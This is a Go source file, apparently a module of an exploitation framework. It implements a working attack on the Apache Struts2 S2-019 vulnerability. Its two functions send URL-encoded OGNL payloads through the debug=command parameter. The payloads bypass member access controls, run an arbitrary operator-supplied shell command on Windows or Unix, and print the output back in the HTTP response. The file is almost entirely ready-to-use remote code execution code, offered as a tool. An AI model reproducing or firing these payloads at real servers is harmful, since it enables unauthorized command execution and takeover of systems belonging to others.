package exp_Struts2

import (
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"net/url"
	"strings"
)

type Exp_S2_019 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_S2_019) Attack_cmd1() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")

	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	shellPayload := `?&debug=command&expression=%20((%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)and(%23osname%3D%40java.lang.System%40getProperty('os.name'))and(%23list%3D%23osname.startsWith('Windows')%3F%7B'cmd.exe'%2C'%2Fc'%2C%23parameters.cmd%5B0%5D%7D%3A%7B'%2Fbin%2Fbash'%2C'-c'%2C%23parameters.cmd%5B0%5D%7D)and(%23req%3D%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'))and(%23hh%3D%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'))and(%23aa%3D(new%20java.lang.ProcessBuilder(%23list)).start())and(%23bb%3D%23aa.getInputStream())and(%23hh.getWriter().println(new%20java.lang.String(new%20org.apache.commons.io.IOUtils().toByteArray(%23bb)%2C%23parameters.encode))%3Ftrue%3Atrue)and(%23hh.getWriter().flush()%3Ftrue%3Atrue)and(%23hh.getWriter().close()))&encode=iso-8859-1&cmd=lz520520`
	cmd = url.PathEscape(cmd)
	shellPayload = strings.Replace(shellPayload, "lz520520", cmd, 1)
	target := strings.TrimRight(self.Params.BaseParam.Target, "?") + shellPayload
	// 发送请求
	httpresp := self.HttpGetWithoutRedirect(target, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Result = httpresp.Body
	return
}

func (self *Exp_S2_019) Attack_cmd2() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	shellPayload := `debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29,%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27{{cmd}}%27%29%2C%23b%3D%23a.getInputStream%28%29%2C%23dis%3Dnew+java.io.DataInputStream%28%23b%29%2C%23buf%3Dnew+byte%5B20000%5D%2C%23dis.read%28%23buf%29%2C%23dis.close%28%29%2C%23msg%3Dnew+java.lang.String%28%23buf%29%2C%23msg%3D%23msg.trim%28%29`
	shellPayload = strings.Replace(shellPayload, "{{cmd}}", cmd, 1)
	shellPayload = url.QueryEscape(shellPayload)

	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(self.Params.BaseParam.Target, shellPayload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Result = httpresp.Body
	return
}

func init() {

	exp_register.ExpStructRegister(&Exp_S2_019{}, "exp_S2_019.yml")
}
